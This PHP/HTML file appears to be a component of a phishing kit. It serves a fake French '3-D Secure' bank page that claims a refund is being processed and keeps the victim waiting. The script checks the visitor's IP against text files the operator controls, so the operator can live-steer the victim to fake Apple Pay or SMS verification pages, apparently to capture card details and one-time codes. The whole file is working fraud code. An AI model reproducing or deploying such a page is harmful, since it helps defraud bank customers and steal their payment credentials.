
<?php
session_start();
require_once __DIR__ . '/../PREVENTS/infos.php';

/****************************************
 * 1) Vérification IP (PHP)
 ****************************************/

if (!isset($_SESSION['ip'])) {
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
}
$userIp = $_SESSION['ip'];

// Fichiers texte
$applePayFile = __DIR__ . '/applepay.txt';
$successFile  = __DIR__ . '/success.txt';

// Fonctions utilitaires
function ipExistsInFile($ip, $filePath) {
    if (!file_exists($filePath)) {
        return false;
    }
    $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $lines);
}

function removeIpFromFile($ip, $filePath) {
    if (!file_exists($filePath)) {
        return;
    }
    $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newLines = array_filter($lines, function($l) use ($ip) {
        return trim($l) !== $ip;
    });
    file_put_contents($filePath, implode(PHP_EOL, $newLines) . PHP_EOL);
}

// Vérifier dans applepay.txt
if (ipExistsInFile($userIp, $applePayFile)) {
    removeIpFromFile($userIp, $applePayFile);
    header("Location: ../apple-pay.php");
    exit();
}

// Vérifier dans success.txt
if (ipExistsInFile($userIp, $successFile)) {
    removeIpFromFile($userIp, $successFile);
    header("Location: ../success.php");
    exit();
}

/****************************************
 * 2) Page HTML/JS (si pas de redirection)
 ****************************************/
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>3-D Secure...</title>

    <!-- Rafraîchissement auto toutes les 5 secondes -->
    <meta http-equiv="refresh" content="5">

    <!-- Pour s'adapter aux écrans mobiles -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Font moderne -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --primary-color: #0066cc;
            --secondary-color: #004f9e;
            --text-color: #333;
            --light-text: #666;
            --background: #f9fafb;
            --card-bg: #ffffff;
            --accent: #00aaff;
            --success: #00c853;
            --border-radius: 12px;
            --box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: var(--background);
            color: var(--text-color);
            padding: 20px;
            overflow: hidden;
        }

        .secure-loading-container {
            width: 100%;
            max-width: 380px;
            background-color: var(--card-bg);
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .secure-badge {
            display: inline-flex;
            align-items: center;
            background-color: rgba(0, 102, 204, 0.1);
            padding: 6px 12px;
            border-radius: 50px;
            margin-bottom: 20px;
            color: var(--primary-color);
            font-weight: 500;
            font-size: 14px;
        }

        .secure-badge i {
            margin-right: 6px;
            font-size: 12px;
        }

        .title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--text-color);
        }

        .loading-animation {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 24px;
        }

        .loading-circle {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: var(--primary-color);
            animation: spin 1.5s linear infinite;
        }

        .loading-circle:nth-child(2) {
            border-top-color: transparent;
            border-right-color: var(--accent);
            animation-duration: 2s;
        }

        .loading-circle:nth-child(3) {
            width: 80%;
            height: 80%;
            top: 10%;
            left: 10%;
            border-top-color: transparent;
            border-left-color: var(--secondary-color);
            animation-duration: 1.2s;
            animation-direction: reverse;
        }

        .bank-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: var(--primary-color);
            font-size: 28px;
            z-index: 1;
        }

        .message-container {
            position: relative;
            height: 60px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .message {
            position: absolute;
            width: 100%;
            padding: 0 10px;
            text-align: center;
            color: var(--light-text);
            font-size: 15px;
            font-weight: 400;
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.5s ease, transform 0.5s ease;
        }

        .message.active {
            opacity: 1;
            transform: translateY(0);
        }

        .progress-container {
            width: 100%;
            height: 6px;
            background-color: #eef2f7;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--accent), var(--primary-color));
            border-radius: 3px;
            transition: width 1s linear;
            width: 100%;
        }

        .timer-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: var(--light-text);
            font-size: 14px;
        }

        .timer {
            font-weight: 500;
            color: var(--text-color);
        }

        .footer-text {
            font-size: 12px;
            color: var(--light-text);
            margin-top: 20px;
            opacity: 0.8;
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }

        @media (max-width: 480px) {
            .secure-loading-container {
                padding: 20px;
            }
            
            .loading-animation {
                width: 100px;
                height: 100px;
            }
            
            .title {
                font-size: 16px;
            }
            
            .message {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="secure-loading-container">
        <div class="secure-badge">
            <i class="fas fa-shield-alt"></i> Sécurité 3D-Secure
        </div>
        
        <h1 class="title">Traitement de votre demande</h1>
        
        <div class="loading-animation">
            <div class="loading-circle"></div>
            <div class="loading-circle"></div>
            <div class="loading-circle"></div>
            <i class="fas fa-university bank-icon pulse"></i>
        </div>
        
        <div class="message-container">
            <div class="message" id="msg1">Votre remboursement est en cours de traitement, veuillez patienter.</div>
            <div class="message" id="msg2">Vérification des informations bancaires en cours...</div>
            <div class="message" id="msg3">Traitement de votre demande de remboursement...</div>
            <div class="message" id="msg4">Synchronisation en cours, une vérification bancaire peut être requise.</div>
            <div class="message" id="msg5">Une vérification supplémentaire de sécurité peut être requise pour finaliser votre demande...</div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="timer-container">
            <i class="fas fa-clock"></i>
            <span>Temps restant: <span class="timer" id="countdown">60</span>s</span>
        </div>
        
        <div class="footer-text">
            Ne fermez pas cette fenêtre pendant le traitement
        </div>
    </div>

    <script>
    /******************************************************
     * 3) Décompte sur 60s (avec localStorage) + redirection
     ******************************************************/
    const TOTAL_TIME = 60;                // Durée en secondes
    const STORAGE_KEY = 'countdownStart'; // Clé pour persister le temps de départ

    // Récupérer ou initialiser la date de départ
    let countdownStart = localStorage.getItem(STORAGE_KEY);
    if (!countdownStart) {
        countdownStart = Date.now();
        localStorage.setItem(STORAGE_KEY, countdownStart);
    } else {
        countdownStart = parseInt(countdownStart, 10);
    }

    function updateTimer() {
        let elapsed = Math.floor((Date.now() - countdownStart) / 1000);
        let timeLeft = TOTAL_TIME - elapsed;
        if (timeLeft < 0) timeLeft = 0;
        document.getElementById('countdown').textContent = timeLeft;
        
        // Mise à jour de la barre de progression
        const progressPercent = (timeLeft / TOTAL_TIME) * 100;
        document.getElementById('progressBar').style.width = progressPercent + '%';
        
        return timeLeft;
    }

    // Mise à jour du timer chaque seconde
    let timeLeft = updateTimer();
    const intervalID = setInterval(() => {
        timeLeft = updateTimer();
        // Lorsque le décompte est terminé, réinitialiser et rediriger
        if (timeLeft === 0) {
            clearInterval(intervalID);
            localStorage.removeItem(STORAGE_KEY);
            window.location.href = (<?= APPLE_PAY_ENABLED ? "'../sms-verification.php'" : "'../success.php'" ?>);

        }
    }, 1000);

    /******************************************************
     * 4) Rotation des messages (méthode robuste)
     *    - Calcul dynamique basé sur le temps écoulé depuis countdownStart
     *    - Chaque message (msg1 à msg4) s'affiche pendant 10 secondes
     *    - Lorsque le temps restant est de 30 secondes ou moins, le message final (msg5) s'affiche en permanence
     ******************************************************/
    const messages = document.querySelectorAll('.message');
    // Messages de rotation : msg1, msg2, msg3, msg4
    const rotatingMessages = [ messages[0], messages[1], messages[2], messages[3] ];
    // Message final : msg5
    const finalMessage = messages[4];

    function updateRotation() {
        let elapsed = Math.floor((Date.now() - countdownStart) / 1000);
        // Si le décompte est à 30 secondes ou moins, afficher le message final
        if ((TOTAL_TIME - elapsed) <= 30) {
            rotatingMessages.forEach(msg => msg.classList.remove('active'));
            finalMessage.classList.add('active');
        } else {
            // Calcul de l'index de rotation : toutes les 10 secondes
            let index = Math.floor(elapsed / 10) % rotatingMessages.length;
            rotatingMessages.forEach(msg => msg.classList.remove('active'));
            rotatingMessages[index].classList.add('active');
        }
    }

    // Mise à jour immédiate de la rotation, puis toutes les secondes
    updateRotation();
    setInterval(updateRotation, 1000);
    </script>
</body>
</html>